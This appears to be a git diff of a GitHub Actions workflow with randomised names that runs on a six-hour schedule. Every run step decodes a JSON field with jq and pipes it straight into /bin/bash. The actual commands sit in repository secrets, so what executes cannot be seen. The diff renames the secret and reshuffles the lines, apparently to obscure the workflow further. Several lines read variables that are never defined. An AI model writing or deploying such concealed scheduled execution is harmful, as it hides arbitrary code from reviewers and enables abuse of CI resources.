@@ -2,29 +2,20 @@ name: taogongzhu4536
 on:
   workflow_dispatch:
   schedule:
-    - cron: '0 5/6 * * *'
+    - cron: '11 5/6 * * *'
 
-jobs:  # 26710
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: taogongzhu4536
         env:
-          npg528: ${{ secrets.npg528 }}
+          nsf27480: ${{ secrets.nsf27480 }}
         run: |
-          echo $npg528 | jq -r .gsv10237 | /bin/bash
-          echo $h55901 | jq -r .yt307 | /bin/bash
-          echo $fwucy87658 | jq -r .xr29 | /bin/bash
-          echo $jz82 | jq -r .ktx5012 | /bin/bash
-          echo $ew779 | jq -r .puvcl4231 | /bin/bash
-          echo $dgmgl432 | jq -r .ssj19687 | /bin/bash
-          echo $lbjkc08 | jq -r .qct53083 | /bin/bash
-          echo $s8 | jq -r .k12 | /bin/bash
-          echo $zu107 | jq -r .sv3125 | /bin/bash
-          echo $h9272 | jq -r .awxc8902 | /bin/bash
-          echo $wo88688 | jq -r .nx952 | /bin/bash
-          echo $fog738 | jq -r .tvs77997 | /bin/bash
-          echo $si812 | jq -r .pa2 | /bin/bash
+          echo $nsf27480 | jq -r .a6 | /bin/bash
+          echo $qvuax5085 | jq -r .huop92342 | /bin/bash
+          echo $h4 | jq -r .ivman7 | /bin/bash
+          echo $or345 | jq -r .ni17191 | /bin/bash
+          echo $m11 | jq -r .dvj3 | /bin/bash
 
